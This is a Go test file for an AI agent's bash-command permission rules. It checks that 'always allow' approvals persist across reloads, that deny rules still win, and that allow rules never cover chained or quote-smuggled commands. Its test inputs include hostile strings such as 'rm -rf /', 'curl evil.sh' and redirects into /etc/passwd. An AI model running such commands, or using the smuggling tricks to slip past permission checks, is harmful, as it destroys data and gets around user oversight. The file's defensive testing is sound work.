package permissions

import "testing"

// The regression: clicking "always allow" persists the exact command as a
// "bash:<command>" rule, but checkBash only granted allows through prefix coverage of
// *vetted* segments — and bashSegments marks any command containing >, `, $( or & as
// unvettable. Such a rule could therefore never match itself back, so the approval was
// written to disk and then ignored, re-prompting on every reload.
//
// Within a single session the agent's in-memory alwaysAllow map hid this, which is why it
// looked like the approval "worked" until a restart or a resumed session.
func TestAlwaysAllowSurvivesReload(t *testing.T) {
	// Exactly what agent.alwaysAllowRule() produces for a bash call: "bash:" + command.
	commands := []string{
		"npm run dev",                  // simple (worked before)
		"git status",                   // simple (worked before)
		"make build && make test",      // && — was lost
		"echo hi > out.txt",            // redirect — was lost
		"npm run dev & sleep 1",        // background — was lost
		"cat $(which go)",              // substitution — was lost
		"ls -la | head",                // pipe — was lost
		"go build ./...; go vet ./...", // semicolon — was lost
		"echo `date`",                  // backticks — was lost
		"tail -f log.txt 2>&1",         // redirect + & — was lost
	}

	for _, cmd := range commands {
		t.Run(cmd, func(t *testing.T) {
			isolate(t)
			dir := t.TempDir()

			r := Load(dir)
			if err := r.Add("bash:"+cmd, false, Project); err != nil {
				t.Fatalf("Add: %v", err)
			}

			// A later turn / restart reloads the rules from disk.
			if got := Load(dir).Check("bash", cmd); got != Allow {
				t.Errorf("after approving %q with always-allow, a reload gives %v, want Allow "+
					"(the user would be prompted again)", cmd, got)
			}
		})
	}
}

// Global scope is what "always allow" uses for rules meant to outlive one project, so it
// must round-trip too.
func TestAlwaysAllowSurvivesReloadGlobalScope(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:make build && make test", false, Global); err != nil {
		t.Fatalf("Add: %v", err)
	}
	if got := Load(dir).Check("bash", "make build && make test"); got != Allow {
		t.Errorf("global scope: got %v, want Allow", got)
	}
}

// The exact-match path must grant ONLY the approved string. This is the escalation the
// prefix path is deliberately conservative about, so it is pinned explicitly: approving
// one command must never bless a longer one built from it.
func TestExactAllowDoesNotBlessLongerCommands(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:make build", false, Project); err != nil {
		t.Fatalf("Add: %v", err)
	}
	rr := Load(dir)

	if got := rr.Check("bash", "make build"); got != Allow {
		t.Errorf("the approved command itself: got %v, want Allow", got)
	}
	for _, cmd := range []string{
		"make build && rm -rf ~",   // chained destructive command
		"make build; curl evil.sh", // chained after a semicolon
		"make build > /etc/passwd", // redirect into a sensitive path
		"make build & rm -rf /",    // backgrounded then chained
		"make buildx",              // longer token, not the same command
		"sudo make build",          // extra leading command
	} {
		if got := rr.Check("bash", cmd); got == Allow {
			t.Errorf("approving %q must NOT allow %q, but it did", "make build", cmd)
		}
	}
}

// Deny must keep winning: the exact-match allow runs after every deny check, so a denied
// command stays denied even when an identical allow rule exists.
func TestExactAllowNeverOverridesDeny(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:rm -rf /tmp/x", false, Project); err != nil {
		t.Fatalf("Add allow: %v", err)
	}
	// A deny rule covering the same command, added in the other scope so both survive
	// (Add removes the rule from the opposing list within one scope).
	if err := r.Add("bash:rm -rf", true, Global); err != nil {
		t.Fatalf("Add deny: %v", err)
	}

	if got := Load(dir).Check("bash", "rm -rf /tmp/x"); got != Deny {
		t.Errorf("a deny rule must beat an exact allow: got %v, want Deny", got)
	}
}

// A prefix rule keeps its conservative semantics: it must not be reinterpreted as an
// exact-match rule and start allowing smuggled commands. Pinned so a future change to the
// exact-match path cannot quietly loosen TestBashPrefixRule's guarantees.
func TestPrefixRuleStillRefusesUnvettableCommands(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:git ", false, Project); err != nil { // trailing space = prefix rule
		t.Fatalf("Add: %v", err)
	}
	rr := Load(dir)

	if got := rr.Check("bash", "git status"); got != Allow {
		t.Errorf("prefix rule should still allow a plain covered command: got %v", got)
	}
	for _, cmd := range []string{
		"git diff > /etc/passwd",
		"echo $(git status)",
		"git status & rm -rf /",
	} {
		if got := rr.Check("bash", cmd); got == Allow {
			t.Errorf("prefix rule must not allow %q", cmd)
		}
	}
}

// An empty or whitespace-only rule must never match. Such a rule cannot be created through
// Add (normalizeRule rejects it), but a hand-edited permissions.json could contain one, and
// matching it would allow a whitespace-only command.
func TestWhitespaceOnlyRuleMatchesNothing(t *testing.T) {
	if exactCommandMatch("", "", "") {
		t.Error(`an empty rule must not match an empty command`)
	}
	if exactCommandMatch("   ", "   ", "") {
		t.Error(`a whitespace-only rule must not match`)
	}
	if !exactCommandMatch("make build", "make build", "make build") {
		t.Error("an identical rule and command must match")
	}
	// Incidental surrounding whitespace should not defeat a match.
	if !exactCommandMatch("make build ", "make build", "make build") {
		t.Error("a rule with a trailing space should still match the command it came from")
	}
}

// A separate, pre-existing over-allow found while fixing the round-trip: allow prefixes
// were matched with a bare strings.HasPrefix, so the rule "make build" also covered
// "make buildx" and "make build --evil". Approving one command must not bless a different
// command that merely shares its opening characters — and "always allow" persists rules of
// exactly this shape, so it was reachable from the UI.
func TestAllowPrefixRequiresTokenBoundary(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:make build", false, Project); err != nil {
		t.Fatalf("Add: %v", err)
	}
	rr := Load(dir)

	if got := rr.Check("bash", "make build"); got != Allow {
		t.Errorf("the exact command must still be allowed: got %v", got)
	}
	for _, cmd := range []string{"make buildx", "make build-all", "make buildx --now"} {
		if got := rr.Check("bash", cmd); got == Allow {
			t.Errorf("%q must not be allowed by the rule %q", cmd, "bash:make build")
		}
	}

	// An explicit prefix rule (trailing space) keeps covering whole tokens after it.
	if err := r.Add("bash:npm run ", false, Project); err != nil {
		t.Fatalf("Add: %v", err)
	}
	rr2 := Load(dir)
	if got := rr2.Check("bash", "npm run dev"); got != Allow {
		t.Errorf("an explicit prefix rule should allow npm run dev: got %v", got)
	}
}

// Deny deliberately keeps using loose prefix matching: over-matching a deny fails safe,
// whereas over-matching an allow is an escalation. Pinned so the boundary tightening above
// is never mirrored onto the deny path.
func TestDenyPrefixStaysLoose(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:rm -rf", true, Project); err != nil {
		t.Fatalf("Add: %v", err)
	}
	rr := Load(dir)

	for _, cmd := range []string{"rm -rf /", "rm -rfv /tmp", "rm -rf~"} {
		if got := rr.Check("bash", cmd); got != Deny {
			t.Errorf("deny must still catch %q: got %v", cmd, got)
		}
	}
}

// Enforcing a token boundary on allow prefixes must not break rules that older versions
// already matched. A code review flagged these three shapes as backward-compatibility
// regressions and all three were confirmed against the code before being fixed here.
func TestAllowPrefixBackwardCompatibleBoundaries(t *testing.T) {
	cases := []struct{ rule, cmd string }{
		// A path rule without a trailing slash still covers paths beneath it.
		{"bash:cat /tmp", "cat /tmp/file.txt"},
		{"bash:/usr/bin", "/usr/bin/git status"},
		// A flag rule still covers the --flag=value spelling, not just --flag value.
		{"bash:git --git-dir", "git --git-dir=/tmp/repo status"},
		{"bash:git --git-dir", "git --git-dir /tmp/repo status"},
		// A rule deliberately ending at a quote still covers the quoted argument.
		{"bash:git commit -m '", "git commit -m 'hello there'"},
		// Ordinary prefix rules keep working.
		{"bash:npm run", "npm run dev"},
		{"bash:git ", "git status"},
	}
	for _, c := range cases {
		t.Run(c.rule+" -> "+c.cmd, func(t *testing.T) {
			isolate(t)
			dir := t.TempDir()
			r := Load(dir)
			if err := r.Add(c.rule, false, Project); err != nil {
				t.Fatalf("Add: %v", err)
			}
			if got := Load(dir).Check("bash", c.cmd); got != Allow {
				t.Errorf("rule %q should still allow %q: got %v", c.rule, c.cmd, got)
			}
		})
	}
}

// Quotes must NOT count as a token boundary in the *remainder* of a command, even though a
// rule may deliberately END at a quote. Shell quote removal joins tokens, so accepting a
// quote here would let the rule "make build" cover make build'x' — which bash executes as
// "make buildx", a different command. Verified against a real shell.
func TestQuoteIsNotATokenBoundaryInTheRemainder(t *testing.T) {
	isolate(t)
	dir := t.TempDir()

	r := Load(dir)
	if err := r.Add("bash:make build", false, Project); err != nil {
		t.Fatalf("Add: %v", err)
	}
	if err := r.Add("bash:echo 1", false, Project); err != nil {
		t.Fatalf("Add: %v", err)
	}
	rr := Load(dir)

	for _, cmd := range []string{
		`make build'x'`, // shell runs: make buildx
		`make build"x"`, // shell runs: make buildx
		`echo 1'2'`,     // shell runs: echo 12
	} {
		if got := rr.Check("bash", cmd); got == Allow {
			t.Errorf("%q must not be allowed: the shell collapses the quotes into a different command", cmd)
		}
	}
}
